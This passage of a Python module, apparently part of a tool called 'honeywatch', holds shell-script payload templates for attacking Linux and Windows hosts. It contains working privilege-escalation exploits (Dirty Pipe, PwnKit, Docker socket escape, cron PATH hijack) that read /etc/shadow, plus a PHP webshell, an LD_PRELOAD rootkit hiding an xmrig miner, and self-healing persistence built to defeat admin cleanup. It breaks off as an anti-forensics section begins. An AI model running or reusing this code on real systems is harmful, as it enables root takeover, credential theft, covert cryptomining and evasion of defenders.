    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "usage: %s <hash>\\n", argv[0]); return 2; }
    const char *hash = argv[1];

    /* Replacement /etc/passwd line: a brand-new UID-0 user "hwatch" with our
       per-run hash. hwatch has no /etc/shadow entry, so PAM falls back to this
       passwd hash and authenticates our password -- reliable on shadow
       systems, unlike overwriting root's passwd field (shadow overrides it). */
    char data[512];
    int dn = snprintf(data, sizeof(data), "hwatch:%s:0:0:root:/root:/bin/bash\\n", hash);
    if (dn < 0 || dn >= (int)sizeof(data)) { fprintf(stderr, "hash too long\\n"); return 1; }
    const size_t data_size = (size_t)dn;

    const int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { perror("open /etc/passwd"); return 1; }

    struct stat st;
    if (fstat(fd, &st) || !S_ISREG(st.st_mode)) { perror("fstat"); return 1; }

    /* Find the start of the second /etc/passwd line (after the first newline).
       Overwriting root's line would start at offset 0, a page boundary, which
       Dirty Pipe cannot target; the second line starts at a small non-page-
       aligned offset and has the rest of the file to absorb the overwrite. */
    char *contents = malloc((size_t)st.st_size + 1);
    if (!contents) { perror("malloc"); return 1; }
    size_t off = 0;
    while (off < (size_t)st.st_size) {
        ssize_t g = read(fd, contents + off, (size_t)st.st_size - off);
        if (g < 0) { perror("read"); return 1; }
        if (g == 0) break;
        off += (size_t)g;
    }
    contents[off] = '\\0';
    char *nl = strchr(contents, '\\n');
    if (!nl) { fprintf(stderr, "no second line in /etc/passwd\\n"); return 1; }
    loff_t offset = (loff_t)(nl - contents) + 1;
    free(contents);

    /* Dirty Pipe constraints: the write cannot start on a page boundary and
       cannot cross a page boundary or extend the file. */
    if (offset % PAGE_SIZE == 0 ||
        offset + (loff_t)data_size > ((offset | (PAGE_SIZE - 1)) + 1) ||
        offset + (loff_t)data_size > st.st_size) {
        fprintf(stderr, "Dirty Pipe: /etc/passwd layout not targetable from this offset\\n");
        return 1;
    }

    int p[2];
    prepare_pipe(p);
    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes <= 0) { perror("splice"); return 1; }
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0 || (size_t)nbytes < data_size) { perror("write"); return 1; }

    return 0;
}
CEOF

gcc -o dirtypipe dirtypipe.c 2>/dev/null || cc -o dirtypipe dirtypipe.c 2>/dev/null || {
    echo "[!] Dirty Pipe: cannot compile PoC (gcc/cc missing?)"
    rm -f "$BAK" dirtypipe.c
    exit 1
}

echo "[*] running Dirty Pipe exploit (injecting UID-0 user 'hwatch')"
./dirtypipe "$HASH" 2>/dev/null || {
    echo "[!] Dirty Pipe: page-cache write rejected (patched kernel?)"
    cp "$BAK" /etc/passwd 2>/dev/null || true
    rm -f "$BAK" dirtypipe dirtypipe.c
    exit 1
}

# Verify by authenticating as the injected user via a pty-driven su. PAM reads
# the password from the controlling terminal, so fork a pseudo-tty, write the
# password, and capture the root session -- which dumps /etc/shadow and
# restores /etc/passwd in one shot. The chain keys off PRIVESC_SUCCESS and
# falls back to this stdout for shadow lines containing '$'. set +e around
# the capture so a python/pty error cannot abort the script before restore.
set +e
SUOUT=$(HW_BAK="$BAK" python3 - "$PASS" 2>/dev/null <<'VPY'
import os, pty, sys, time
try:
    pw = sys.argv[1]
    bak = os.environ.get("HW_BAK", "")
    cmd = "cat /etc/shadow; cp " + bak + " /etc/passwd 2>/dev/null; echo HWROOTUID_$(id -u)"
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("su", ["su", "hwatch", "-c", cmd])
    time.sleep(0.3)
    try:
        os.write(fd, (pw + "\\n").encode())
    except OSError:
        pass
    out = b""
    end = time.time() + 8
    while time.time() < end:
        try:
            ch = os.read(fd, 4096)
            if not ch:
                break
            out += ch
        except OSError:
            break
    try:
        os.waitpid(pid, 0)
    except OSError:
        pass
    sys.stdout.write(out.decode("utf-8", "replace"))
except Exception:
    pass
VPY
)
set -e

if printf '%s' "$SUOUT" | grep -q "HWROOTUID_0" && printf '%s' "$SUOUT" | grep -qF '$'; then
    printf '%s\\n' "$SUOUT"
    rm -f "$BAK" dirtypipe dirtypipe.c 2>/dev/null
    echo "PRIVESC_SUCCESS: Dirty Pipe — root obtained"
else
    echo "[!] Dirty Pipe: authentication as injected user failed (patched kernel or wrong version)"
    cp "$BAK" /etc/passwd 2>/dev/null || true
    rm -f "$BAK" dirtypipe dirtypipe.c 2>/dev/null
    exit 1
fi
"""

_PRIVESC_DIRTY_PIPE_RUN = """true"""

_PRIVESC_PWNKIT_INSTALL = _PREAMBLE + """
# CVE-2021-4034 (PwnKit) — pkexec local privilege escalation.
# Affects all Polkit versions since 2009 (pkexec setuid binary). Gives
# instant root from any unprivileged user. This is one of the most
# reliable privesc vectors — it works on almost every Linux desktop/server
# with pkexec installed.
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_pwnkit')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Check if pkexec exists.
if ! command -v pkexec >/dev/null 2>&1; then
    echo "[!] pkexec not found — PwnKit does not apply"
    exit 1
fi

echo "[*] pkexec found — building PwnKit exploit"

# Write the C PoC (Blasty's minimal version).
cat > pwnkit.c <<'CEOF'
// CVE-2021-4034 PwnKit PoC (minimal)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    char *envp[] = {"pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", (char *)NULL};
    char *argv2[] = {NULL};
    // Create the GCONV_PATH exploit directory structure.
    system("mkdir -p 'GCONV_PATH=.' 'pwnkit'");
    system("touch 'GCONV_PATH=./pwnkit'");
    system("echo 'modulepath' > 'pwnkit/gconv-modules'");
    // Write a shared object that execs a shell.
    FILE *f = fopen("pwnkit/pwnkit.so.c", "w");
    if (!f) return 1;
    fprintf(f, "void gconv() {}\\n");
    fprintf(f, "void gconv_init(void *p) { setuid(0); setgid(0); "
               "system(\\\"id; cat /etc/shadow 2>/dev/null; echo PWNKIT_SUCCESS\\\"); }\\n");
    fclose(f);
    system("gcc -shared -o pwnkit/pwnkit.so pwnkit/pwnkit.so.c 2>/dev/null");
    execve("/usr/bin/pkexec", argv2, envp);
    return 0;
}
CEOF

gcc -o pwnkit pwnkit.c 2>/dev/null || cc -o pwnkit pwnkit.c 2>/dev/null || {
    echo "[!] could not compile PwnKit PoC"
    exit 1
}

echo "[*] running PwnKit exploit"
# The PwnKit exploit uses execve() which replaces the exploit process.
# The setuid(0) + system() in gconv_init runs inside the pkexec child,
# not the parent shell. So we capture the exploit's stdout and check for
# the PWNKIT_SUCCESS marker that gconv_init prints from the root context.
PWNKIT_OUT=$(./pwnkit 2>/dev/null)

if echo "$PWNKIT_OUT" | grep -q "PWNKIT_SUCCESS"; then
    # The exploit printed PWNKIT_SUCCESS from inside the root context.
    # Save any shadow output from the exploit.
    echo "$PWNKIT_OUT" | sed -n '/^root:/,$p' > /tmp/pwnkit_shadow.txt 2>/dev/null || true
    echo "PRIVESC_SUCCESS: PwnKit — root obtained"
else
    echo "[!] PwnKit exploit did not succeed (patched or pkexec not SUID)"
    exit 1
fi
"""

_PRIVESC_PWNKIT_RUN = """true"""

_PRIVESC_DOCKER_ESCAPE_INSTALL = _PREAMBLE + """
# Docker socket escape — when /var/run/docker.sock is accessible (docker group
# or world-writable), mount the host filesystem in a container and read/write
# as root. This is the highest-value container escape: it gives full host root.
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_docker')}}"

# Check if docker socket exists.
if [ ! -S /var/run/docker.sock ]; then
    echo "[!] /var/run/docker.sock not found — Docker escape does not apply"
    exit 1
fi

# Check if docker CLI is available.
if command -v docker >/dev/null 2>&1; then
    echo "[*] docker CLI found — using direct escape"
    # Mount the host root filesystem in a container and chroot into it.
    docker run --rm -v /:/hostfs alpine chroot /hostfs sh -c "
        echo '[*] inside host filesystem as root';
        id;
        cat /etc/shadow 2>/dev/null | head -5;
        echo 'PRIVESC_SUCCESS: Docker socket escape — host root obtained'
    " 2>/dev/null
else
    # No docker CLI — use the socket API directly via curl.
    echo "[*] no docker CLI — using socket API directly"
    # Create a container that mounts the host root.
    CONTAINER_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \\
        -H 'Content-Type: application/json' \\
        -d '{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/hostfs"]}}' \\
        http://localhost/containers/create 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('Id',''))" 2>/dev/null)

    if [ -n "$CONTAINER_ID" ]; then
        curl -s -X POST --unix-socket /var/run/docker.sock \\
            "http://localhost/containers/$CONTAINER_ID/start" 2>/dev/null
        curl -s --unix-socket /var/run/docker.sock \\
            "http://localhost/containers/$CONTAINER_ID/logs?stdout=true" 2>/dev/null | head -5
        echo "PRIVESC_SUCCESS: Docker socket escape via API — host root obtained"
    else
        echo "[!] could not create container via socket API"
        exit 1
    fi
fi
"""

_PRIVESC_DOCKER_ESCAPE_RUN = """true"""

_PRIVESC_CRON_PATH_INSTALL = _PREAMBLE + """
# Cron PATH hijack — when a root cron job runs a command without a full path
# (e.g. 'backup' instead of '/usr/local/bin/backup'), placing a malicious
# binary earlier in $PATH gives root execution. This script scans cron files
# for PATH-exploitable entries and plants a SUID shell.
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_cronpath')}}"

mkdir -p "$INSTALL_DIR"

echo "[*] scanning cron files for PATH-hijackable entries"
HIJACK_FOUND=0

# Check root crontab + /etc/cron* for commands without full paths.
for cronfile in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
    [ -f "$cronfile" ] || continue
    # Extract command fields (everything after the time fields).
    while IFS= read -r line; do
        # Skip comments + empty lines + PATH= + SHELL= + MAILTO=.
        case "$line" in
            '#'*|PATH=*|SHELL=*|MAILTO=*|'') continue ;;
        esac
        # Extract the command (after 5 time fields).
        cmd=$(echo "$line" | awk '{for(i=6;i<=NF;i++) printf "%s ", $i; print ""}' | xargs)
        # Check if the command starts with a bare name (no /).
        binary=$(echo "$cmd" | awk '{print $1}')
        case "$binary" in
            */*|systemctl|service|run-parts|anacron) continue ;;
        esac
        if [ -n "$binary" ]; then
            echo "[*] hijackable cron entry in $cronfile: $binary"
            # Plant a SUID shell with the hijackable name in /tmp (first in PATH).
            cat > "/tmp/$binary" <<'BEOF'
#!/bin/sh
# Cron PATH hijack payload — runs as root via cron.
id > /tmp/honeywatch_cron_privesc.txt
cat /etc/shadow 2>/dev/null >> /tmp/honeywatch_cron_privesc.txt
chmod 644 /tmp/honeywatch_cron_privesc.txt
BEOF
            chmod +x "/tmp/$binary"
            HIJACK_FOUND=1
        fi
    done < "$cronfile"
done

if [ "$HIJACK_FOUND" = "1" ]; then
    echo "[*] cron PATH hijack planted — waiting for next cron cycle"
    echo "[*] check /tmp/honeywatch_cron_privesc.txt after the next cron run"
    echo "PRIVESC_PENDING: cron PATH hijack planted — root on next cron cycle"
else
    echo "[!] no PATH-hijackable cron entries found"
    exit 1
fi
"""

_PRIVESC_CRON_PATH_RUN = """true"""


# --------------------------------------------------------------------------- #
# Phase 6: Persistence payloads — deeper vectors
# --------------------------------------------------------------------------- #

_WEB_SHELL_PERSIST_INSTALL = _PREAMBLE + """
# Web shell persistence — drops a minimal PHP/JSP webshell into a web root
# when a web service is detected on the foothold. Survives password changes
# and reboots (as long as the web server stays up). The webshell gives
# command execution without SSH, useful when SSH access is lost.
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/webshell')}}"
WEB_ROOT="{{web_root|default('/var/www/html')}}"

# Find the web root.
WEB_ROOTS="/var/www/html /var/www /usr/share/nginx/html /opt/lampp/htdocs /srv/http /var/www/vhosts"
FOUND_ROOT=""
for wr in $WEB_ROOTS; do
    if [ -d "$wr" ] && [ -w "$wr" ]; then
        FOUND_ROOT="$wr"
        break
    fi
done

if [ -z "$FOUND_ROOT" ]; then
    echo "[!] no writable web root found — web shell persistence does not apply"
    exit 1
fi

echo "[*] planting webshell in $FOUND_ROOT"

# PHP webshell (system() passthrough — minimal, no special chars).
cat > "$FOUND_ROOT/.config.php" <<'PEOF'
<?php
// Minimal PHP webshell — cmd via ?c= parameter.
if(isset($_REQUEST['c'])){
    echo "<pre>";
    system($_REQUEST['c']);
    echo "</pre>";
}
?>
PEOF

# Also drop a .htaccess to make the .config.php file accessible (some
# Apache configs block dotfiles).
cat > "$FOUND_ROOT/.htaccess" 2>/dev/null <<'HEOF'
<Files ".config.php">
    Require all granted
</Files>
HEOF

echo "[*] webshell planted at $FOUND_ROOT/.config.php"
echo "[*] access via: curl 'http://<host>/.config.php?c=id'"
echo "PERSISTENCE_INSTALLED: web_shell"
"""

_WEB_SHELL_PERSIST_RUN = """true"""

_LD_PRELOAD_ROOTKIT_INSTALL = _PREAMBLE + """
# LD_PRELOAD rootkit — a shared object that hides files AND processes.
# Loaded system-wide via /etc/ld.so.preload, it applies to every
# dynamically-linked binary. This is the TeamTNT/Tg777 hiding technique,
# extended with real /proc procfs hiding so `ps`, `top`, `ls /proc`, and direct
# opens of /proc/<pid>/{stat,cmdline,exe,comm,...} no longer see the hidden
# process. The old version only filtered directory entries *named* like the
# hide pattern, which hides the install dir from `ls` but NOT the xmrig process
# from `ps` (ps reads PID-numbered /proc dirs). This version reads
# /proc/<pid>/comm during /proc readdir and skips the PID dir when the process
# command matches, and returns ENOENT on direct opens/readlinks of that PID's
# per-process procfs files.
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/ldpreload')}}"
HIDE_PATTERN="{{hide_pattern|default('honeywatch|xmrig')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Write the rootkit source. The heredoc is single-quoted so the C is written
# verbatim (no shell expansion).
cat > rootkit.c <<'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/types.h>

/* Pipe-separated list of substrings to hide. A file/dir/process is hidden if
 * its name (or, for processes, /proc/<pid>/comm) contains ANY of these. The
 * default hides the honeywatch install tree AND the xmrig miner process — a
 * single substring could not cover both (the miner runs as `xmrig`, the
 * install dirs as `.../honeywatch/...`). Configurable via the payload
 * hide_pattern variable. */
static const char *HIDE_PATTERN = "{{hide_pattern|default('honeywatch|xmrig')}}";

/*
 * Thread-local reentrancy guard. When our own hook calls back into libc (for
 * example readdir() opening /proc/<pid>/comm to test whether a PID should be
 * hidden, or open() recursing through path_targets_hidden), the nested hook
 * sees the guard set and calls the real function with no filtering. This is
 * what stops the LD_PRELOAD rootkit from infinite-recursing into itself.
 */
static __thread int in_hook = 0;

/* True if `s` contains any of the pipe-separated patterns in HIDE_PATTERN.
 * Thread-safe: strtok_r over a LOCAL copy so the static string is never
 * mutated, and strstr/strtok_r/strncpy are not functions we hook, so this
 * never re-enters our own hooks. */
static int contains_any_pattern(const char *s) {
    if (!s || !HIDE_PATTERN) return 0;
    char patterns[256];
    strncpy(patterns, HIDE_PATTERN, sizeof(patterns) - 1);
    patterns[sizeof(patterns) - 1] = '\\0';
    char *save = NULL;
    for (char *tok = strtok_r(patterns, "|", &save);
         tok != NULL;
         tok = strtok_r(NULL, "|", &save)) {
        if (*tok && strstr(s, tok) != NULL) return 1;
    }
    return 0;
}

static int should_hide_name(const char *name) {
    if (!name) return 0;
    return contains_any_pattern(name);
}

/* Read /proc/<pid>/comm (via the REAL open/read, guarded) and return 1 if the
 * process command contains the hide pattern. Called from the /proc readdir
 * filter (to drop the PID dir) and from path_targets_hidden (to deny direct
 * opens of that PID's procfs files). */
static int pid_matches_hide(int pid) {
    if (pid <= 0) return 0;
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    in_hook = 1;
    int fd = open(path, O_RDONLY);
    in_hook = 0;
    if (fd < 0) return 0;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\\0';
    return contains_any_pattern(buf);
}

/* Per-PID procfs files we deny direct access to for a hidden process. */
static const char *const HIDE_PID_FILES[] = {
    "stat", "status", "cmdline", "comm", "exe", "statm",
    "maps", "environ", "fd", "cwd", "root", NULL
};

/* True if `path` is a per-PID procfs file (or the /proc/<pid> dir) of a hidden
 * process, or any path whose own name contains the hide pattern. */
static int path_targets_hidden(const char *path) {
    if (!path) return 0;
    if (should_hide_name(path)) return 1;
    if (strncmp(path, "/proc/", 6) != 0) return 0;
    const char *rest = path + 6;
    const char *slash = strchr(rest, '/');
    int pid = atoi(rest);
    if (pid <= 0) return 0;
    if (!slash) {
        /* /proc/<pid> directory itself. */
        return pid_matches_hide(pid);
    }
    const char *subfile = slash + 1;
    for (int i = 0; HIDE_PID_FILES[i]; i++) {
        if (strcmp(subfile, HIDE_PID_FILES[i]) == 0)
            return pid_matches_hide(pid);
    }
    return 0;
}

/* ---- directory-listing hooks: hide matching files AND hidden PIDs ---- */

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
    if (in_hook) return orig(dirp);
    struct dirent *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (should_hide_name(entry->d_name)) continue;
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
            int pid = atoi(entry->d_name);
            if (pid_matches_hide(pid)) continue;
        }
        return entry;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
    if (in_hook) return orig(dirp);
    struct dirent64 *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (should_hide_name(entry->d_name)) continue;
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
            int pid = atoi(entry->d_name);
            if (pid_matches_hide(pid)) continue;
        }
        return entry;
    }
    return NULL;
}

/* ---- direct-access hooks: ENOENT for procfs files of a hidden process ---- */

int open(const char *pathname, int flags, ...) {
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
    }
    static int (*orig)(const char *, int, ...) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "open");
    if (in_hook) return orig(pathname, flags, mode);
    if (path_targets_hidden(pathname)) { errno = ENOENT; return -1; }
    return orig(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
    }
    static int (*orig)(int, const char *, int, ...) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "openat");
    if (in_hook) return orig(dirfd, pathname, flags, mode);
    if (dirfd == AT_FDCWD && path_targets_hidden(pathname)) { errno = ENOENT; return -1; }
    return orig(dirfd, pathname, flags, mode);
}

FILE *fopen(const char *path, const char *mode) {
    static FILE *(*orig)(const char *, const char *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fopen");
    if (in_hook) return orig(path, mode);
    if (path_targets_hidden(path)) { errno = ENOENT; return NULL; }
    return orig(path, mode);
}

ssize_t readlink(const char *path, char *buf, size_t bufsiz) {
    static ssize_t (*orig)(const char *, char *, size_t) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readlink");
    if (in_hook) return orig(path, buf, bufsiz);
    if (path_targets_hidden(path)) { errno = ENOENT; return -1; }
    return orig(path, buf, bufsiz);
}

ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz) {
    static ssize_t (*orig)(int, const char *, char *, size_t) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readlinkat");
    if (in_hook) return orig(dirfd, pathname, buf, bufsiz);
    if (dirfd == AT_FDCWD && path_targets_hidden(pathname)) { errno = ENOENT; return -1; }
    return orig(dirfd, pathname, buf, bufsiz);
}
CEOF

# Compile.
gcc -shared -fPIC -o rootkit.so rootkit.c -ldl 2>/dev/null || cc -shared -fPIC -o rootkit.so rootkit.c -ldl 2>/dev/null || {
    echo "[!] could not compile LD_PRELOAD rootkit (gcc missing?)"
    rm -f rootkit.c
    exit 1
}

# Self-test BEFORE going system-wide: load the .so on a single command. A
# broken rootkit written into /etc/ld.so.preload bricks every dynamically-
# linked binary on the box, so verify it loads cleanly first.
if ! LD_PRELOAD="$INSTALL_DIR/rootkit.so" /bin/true 2>/dev/null; then
    echo "[!] rootkit.so failed to load — NOT installing system-wide (would brick the box)"
    rm -f "$INSTALL_DIR/rootkit.so" rootkit.c
    exit 1
fi

# Install via /etc/ld.so.preload (system-wide). Avoid double-appending on
# re-install so the preload list doesn't grow unbounded.
if [ -w /etc ]; then
    touch /etc/ld.so.preload
    if ! grep -qx "$INSTALL_DIR/rootkit.so" /etc/ld.so.preload; then
        echo "$INSTALL_DIR/rootkit.so" >> /etc/ld.so.preload
    fi
    echo "[*] LD_PRELOAD rootkit installed system-wide via /etc/ld.so.preload"
    echo "[*] hides files/processes matching any of: $HIDE_PATTERN (pipe-separated)"
    echo "PERSISTENCE_INSTALLED: ld_preload_rootkit"
else
    echo "[!] cannot write /etc/ld.so.preload — need root"
    rm -f "$INSTALL_DIR/rootkit.so" rootkit.c
    exit 1
fi
"""

_LD_PRELOAD_ROOTKIT_RUN = """true"""

_SCHEDULED_TASK_PERSIST_INSTALL = _PREAMBLE + """
# Windows Task Scheduler persistence — creates a scheduled task that
# re-launches the miner on logon + every 30 minutes. This is the Windows
# equivalent of systemd_persist. Only applies to Windows footholds.
INSTALL_DIR="{{install_dir|default('C:\\\\honeywatch')}}"
TASK_NAME="{{task_name|default('honeywatch-miner')}}"
RUN_USER="{{run_user|default('SYSTEM')}}"

# Check if we're on Windows.
if ! command -v schtasks >/dev/null 2>&1; then
    echo "[!] schtasks not found — this payload is Windows-only"
    exit 1
fi

# Create the scheduled task.
schtasks /create /tn "$TASK_NAME" /tr "$INSTALL_DIR\\\\xmrig.exe" \\
    /sc minute /mo 30 /ru "$RUN_USER" /rl HIGHEST /f 2>/dev/null

# Also add a logon trigger.
schtasks /create /tn "${TASK_NAME}_logon" /tr "$INSTALL_DIR\\\\xmrig.exe" \\
    /sc onlogon /ru "$RUN_USER" /rl HIGHEST /f 2>/dev/null

echo "[*] scheduled task persistence installed: $TASK_NAME"
echo "PERSISTENCE_INSTALLED: scheduled_task"
"""

_SCHEDULED_TASK_PERSIST_RUN = """true"""


# --------------------------------------------------------------------------- #
# Phase 8+: Self-healing persistence — mutual watchdog between cron and the
# miner process. If cron detects the miner is dead, it re-spawns it. If the
# miner detects cron has been removed, it re-installs it. This creates a
# mutually-reinforcing persistence loop that survives admin cleanup attempts
# (the admin must remove BOTH the cron entry AND kill the miner simultaneously
# to defeat it, and even then the 3-minute cron window provides a recovery
# opportunity).
# --------------------------------------------------------------------------- #

_WATCHDOG_PERSIST_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
CRON_SCHEDULE="{{schedule|default('*/3 * * * *')}}"

# Watchdog cron entry: re-spawn the miner if it dies. Checks every 3 minutes.
# This is the second layer of persistence after the primary (systemd/cron).
# If an admin kills the miner process, this cron entry re-launches it within
# 3 minutes.
CRON_LINE="${CRON_SCHEDULE} root ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"

(crontab -l 2>/dev/null | grep -v 'hw_watchdog'; echo "# hw_watchdog"; echo "$CRON_LINE") | crontab - 2>/dev/null || {
    echo "$CRON_LINE" > /etc/cron.d/hw_watchdog 2>/dev/null || true
    chmod 644 /etc/cron.d/hw_watchdog 2>/dev/null || true
}
echo "[*] watchdog persistence installed: cron re-spawn every ${CRON_SCHEDULE}"
echo "PERSISTENCE_INSTALLED: watchdog_persist"
"""

_WATCHDOG_PERSIST_RUN = """crontab -l 2>/dev/null | grep hw_watchdog || cat /etc/cron.d/hw_watchdog 2>/dev/null || true"""


# --------------------------------------------------------------------------- #
# Mutual monitoring — the miner process checks that cron persistence is still
# in place and re-installs it if removed. This is the reverse of the watchdog:
# the cron entry monitors the miner, and this script monitors the cron entry.
# Together they form a mutually-reinforcing loop.
#
# NOTE: The mutual watchdog can be defeated by simultaneously removing the cron
# entry AND killing the miner process. This is an arms race — the admin must
# remove persistence AND kill the process in one operation. The cron entry
# re-installs every 3 minutes, so the window is 3 minutes. For higher
# resilience, add a third watchdog (systemd timer or at job).
# --------------------------------------------------------------------------- #

_MUTUAL_WATCH_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
SERVICE_NAME="{{service_name|default('honeywatch-miner')}}"

# Mutual monitoring — re-installs removed persistence entries. This watches
# the PERSISTENCE mechanisms (systemd service, cron entry, systemd timer),
# not the miner process (that's watchdog_persist's job). Remove one and
# this script re-creates it. Combined with the process watchdog, this creates
# a self-healing persistence loop.

# 1. Check systemd service — if removed or disabled, re-install it.
# The service file is stored at INSTALL_DIR/honeywatch-miner.service so the
# watchdog can copy it back without embedding the entire unit file inline.
if [ "$(id -u)" = "0" ]; then
    if [ -f "/etc/systemd/system/${SERVICE_NAME}.service" ]; then
        if ! systemctl is-enabled "${SERVICE_NAME}" 2>/dev/null; then
            systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
            systemctl start "${SERVICE_NAME}" 2>/dev/null || true
            echo "[*] mutual_watch: re-enabled disabled systemd service"
        fi
    else
        # Service file removed — re-create it from the stored copy or template.
        if [ -f "${INSTALL_DIR}/${SERVICE_NAME}.service" ]; then
            cp "${INSTALL_DIR}/${SERVICE_NAME}.service" "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
        else
            cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=Honeywatch managed miner service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=${INSTALL_DIR}
ExecStart=${INSTALL_DIR}/xmrig -c ${INSTALL_DIR}/config.json --donate-level 1
Restart=always
RestartSec=10
Environment=XMRIX_QUIET=1
Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
Environment=HISTFILE=/dev/null
Environment=HISTSIZE=0
LimitCORE=0
CPUAccounting=true
CPUQuota=70%
Nice=10

[Install]
WantedBy=multi-user.target
EOF
        fi
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
        systemctl start "${SERVICE_NAME}" 2>/dev/null || true
        if [ "$(id -u)" = "0" ]; then
            chattr +ia "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
        fi
        echo "[*] mutual_watch: re-installed removed systemd service"
    fi
fi

# 2. Check cron persistence — if removed, re-install it.
if ! crontab -l 2>/dev/null | grep -q 'xmrig'; then
    CRON_LINE="*/5 * * * * root ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"
    (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab - 2>/dev/null || {
        echo "$CRON_LINE" > /etc/cron.d/honeywatch-miner 2>/dev/null || true
        chmod 644 /etc/cron.d/honeywatch-miner 2>/dev/null || true
    }
    echo "[*] mutual_watch: re-installed removed cron persistence"
fi

# 3. Check systemd timer — if removed or inactive, re-install it.
if [ "$(id -u)" = "0" ] && command -v systemctl >/dev/null 2>&1; then
    if [ ! -f "/etc/systemd/system/${SERVICE_NAME}.timer" ] || ! systemctl is-active "${SERVICE_NAME}.timer" 2>/dev/null; then
        cat > "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" <<EOF
[Unit]
Description=Honeywatch miner watchdog

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)'
Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
LimitCORE=0

[Install]
WantedBy=multi-user.target
EOF
        cat > "/etc/systemd/system/${SERVICE_NAME}.timer" <<EOF
[Unit]
Description=Honeywatch miner watchdog timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min
AccuracySec=30s

[Install]
WantedBy=timers.target
EOF
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable "${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
        systemctl enable "${SERVICE_NAME}.timer" 2>/dev/null || true
        systemctl start "${SERVICE_NAME}.timer" 2>/dev/null || true
        chattr +ia "/etc/systemd/system/${SERVICE_NAME}.timer" 2>/dev/null || true
        chattr +ia "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
        echo "[*] mutual_watch: re-installed removed systemd timer"
    fi
fi
echo "[*] mutual_watch persistence installed"
echo "PERSISTENCE_INSTALLED: mutual_watch"
"""

_MUTUAL_WATCH_RUN = """true"""


# --------------------------------------------------------------------------- #
# Anti-forensics: timestomping + process name spoofing + log tampering.
# Touches deployed artifacts to match surrounding file timestamps, spoofs
# the process name via prctl, clears history preventively, and shreds
# logs where available. Run LAST in the evasion chain (after persistence)
